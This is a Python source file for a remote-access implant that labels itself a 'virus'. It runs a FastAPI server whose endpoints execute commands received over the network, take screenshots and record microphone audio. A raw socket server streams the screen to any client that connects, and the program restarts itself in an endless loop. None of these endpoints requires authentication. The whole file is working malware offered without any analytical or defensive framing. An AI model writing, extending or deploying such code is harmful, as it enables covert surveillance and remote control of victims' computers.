import PIL.Image
import utils as ut
import uvicorn
import cv2
import PIL
import io
import socket
import math
import time
from fastapi import FastAPI,Response
from runner import prosses_command
from threading import Thread

app = FastAPI()

@app.post("/command")
async def receive_dict(data: dict): 
    try:
        answer = await prosses_command(data)
        if ("media_type" in answer.keys()):
            return Response(content=answer['content'],media_type=answer['media_type'])
        answer["valid"] = True
        if (not "message" in answer.keys()  ): answer["message"] = "run without crash"
        return answer
    except Exception as e:
        return {"valid":False,"message":str(e)}

@app.get("/screenshot")
async def get_screenshot(data: dict={}):
    try:
        monitor = data["monitor"] if ("monitor" in data.keys()) else 1
        pix = data["pix"] if ("pix" in data.keys()) else None
        img = ut.get_screenshot_async2(monitor,pix) 
        
        #_,img_jpeg = cv2.imencode(".jpg",img)
        #return Response(content=img_jpeg.tobytes(),media_type="image/jpg")
        
        buffer = io.BytesIO()
        PIL.Image.fromarray(img).save(buffer,format='JPEG',quality=20)
        
        return Response(content=buffer.getvalue(),media_type="image/jpg")
    except Exception as e:
        return {"valid":False, "message":f"fail to take screenshot with error {e}"}

@app.get("/record")
async def get_recording(data: dict={}):
    try:
        t1 = time.perf_counter()
        der = data['time'] if 'time' in data.keys() else 1
        data = ut.record(der)
        print(f"wanter to record for {der} took {time.perf_counter() - t1}")
        return Response(content=data,media_type="audio/wav")
    except Exception as e:
        print(f"fail to record with error {e}")
        


def start():
    ip,port = ut.get_ip(),8000
    uvicorn.run(app,host=ip,port=port)
    print(f"start run virus at {ip}:{port}")
    
def open_socket():
    def hanel_req(client, addr, size):
        img = ut.get_screenshot_async2(1,None) 
        buffer = io.BytesIO()
        PIL.Image.fromarray(img).save(buffer,format='JPEG',quality=20)
        
        res = buffer.getvalue()
        
        """rs_bts = len(res).to_bytes(32,'little')
        print(f"size is {len(res)}")
        client.sendto(rs_bts,addr)
        
        for i in range(math.ceil(len(res) / size)):
            part = res[i*size:min(i*size+size,len(res))]
            print(len(part))
            client.sendto(part,addr)"""
        client.sendall(res)
        client.close()
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    ip, port = ut.get_ip(), 1234
    server.bind((ip,port))
    server.listen(5)
    print(f"socket on")
    while (True):
        #cs, addr = server.recvfrom(2048)
        cs, addr = server.accept()
        print(f"got from {addr}")
        Thread(target=hanel_req,args=(cs,addr,2**14)).start()
        

if (__name__ == "__main__"):
    print(ut.get_ip())
    while (True):
        start()
        print(f"fail at {time.time()}")